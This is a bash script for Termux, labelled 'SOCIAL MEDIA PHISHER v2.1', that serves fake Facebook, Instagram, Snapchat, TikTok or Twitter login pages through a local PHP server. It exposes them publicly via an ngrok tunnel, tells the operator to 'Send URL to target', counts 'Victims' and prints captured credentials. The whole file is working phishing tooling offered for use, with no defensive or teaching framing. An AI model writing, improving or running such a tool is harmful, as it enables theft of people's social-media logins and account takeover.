#!/data/data/com.termux/files/usr/bin/bash

# Colors
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
PURPLE='\033[0;35m'
CYAN='\033[0;36m'
NC='\033[0m'

clear_screen() {
    clear
    echo -e "${CYAN}╔══════════════════════════════════════════════════════╗${NC}"
    echo -e "${CYAN}║              ${RED}SOCIAL MEDIA PHISHER${NC}               ${CYAN}║${NC}"
    echo -e "${CYAN}║                  ${BLUE}v2.1 - Termux${NC}                     ${CYAN}║${NC}"
    echo -e "${CYAN}╚══════════════════════════════════════════════════════╝${NC}"
    echo
}

show_menu() {
    echo -e "${GREEN}Select Platform:${NC}"
    echo "1) ${YELLOW}Facebook${NC}"
    echo "2) ${YELLOW}Instagram${NC}"
    echo "3) ${YELLOW}Snapchat${NC}"
    echo "4) ${YELLOW}TikTok${NC}"
    echo "5) ${YELLOW}Twitter${NC}"
    echo "6) ${YELLOW}Custom${NC}"
    echo "7) ${GREEN}View Creds${NC}"
    echo "0) ${RED}Exit${NC}"
    echo
}

start_phish() {
    local platform=$1
    local port=8080
    
    # Copy template to root
    cp "templates/${platform}.html" index.html
    
    echo -e "${GREEN}[+] Starting ${YELLOW}$platform${GREEN} server:${NC} ${port}"
    
    # Start PHP server
    php -S 0.0.0.0:$port > /dev/null 2>&1 &
    PHP_PID=$!
    sleep 2
    
    # Ngrok tunnel (if available)
    NGROK_URL=""
    if command -v ngrok >/dev/null 2>&1; then
        ngrok http $port > ngrok.log 2>&1 &
        NGROK_PID=$!
        sleep 3
        NGROK_URL=$(grep -o 'https://.*ngrok.io' ngrok.log | head -1 || echo "")
        [ -n "$NGROK_URL" ] && echo -e "${GREEN}[+] Public:${NC} ${CYAN}${NGROK_URL}${NC}"
    fi
    
    echo -e "${GREEN}[+] Local:${NC} ${CYAN}http://localhost:${port}${NC}"
    echo -e "${PURPLE}[*] Send URL to target. Ctrl+C to stop.${NC}"
    echo
    
    # Live stats loop
    while kill -0 $PHP_PID 2>/dev/null; do
        count=$(grep -c "CREDENTIALS_STOLEN" logs/credentials.txt 2>/dev/null || echo 0)
        echo -e "${GREEN}👥 Victims:${RED} ${count}${NC} | ${GREEN}Server:${NC} 🟢"
        sleep 2
    done
    
    # Cleanup
    kill $PHP_PID $NGROK_PID 2>/dev/null
    rm -f ngrok.log index.html
}

show_creds() {
    echo -e "${GREEN}=== 🕷️ CAPTURED CREDS ===${NC}"
    if [ -f "logs/readable.txt" ]; then
        cat logs/readable.txt
    else
        echo -e "${YELLOW}[!] No credentials captured yet${NC}"
    fi
    read -p "Press Enter to continue..."
}

main() {
    # Check PHP
    if ! command -v php >/dev/null 2>&1; then
        echo -e "${RED}[!] PHP required:${NC} pkg install php"
        exit 1
    fi
    
    # Create directories
    mkdir -p logs www
    
    clear_screen
    show_menu
    read -p "Choice: " choice
    
    case $choice in
        1) start_phish "facebook" ;;
        2) start_phish "instagram" ;;
        3) start_phish "snapchat" ;;
        4) start_phish "tiktok" ;;
        5) start_phish "twitter" ;;
        6)
            echo "Available templates:"
            ls templates/*.html | sed 's/templates\///g' | nl
            read -p "Enter filename (ex: facebook.html): " file
            if [ -f "templates/$file" ]; then
                start_phish "$file"
            else
                echo -e "${RED}[!] File not found${NC}"
                sleep 2
                main
            fi
            ;;
        7) show_creds ;;
        0) exit 0 ;;
        *) echo -e "${RED}[!] Invalid choice${NC}"; sleep 1; main ;;
    esac
}

# Run main
main "$@"
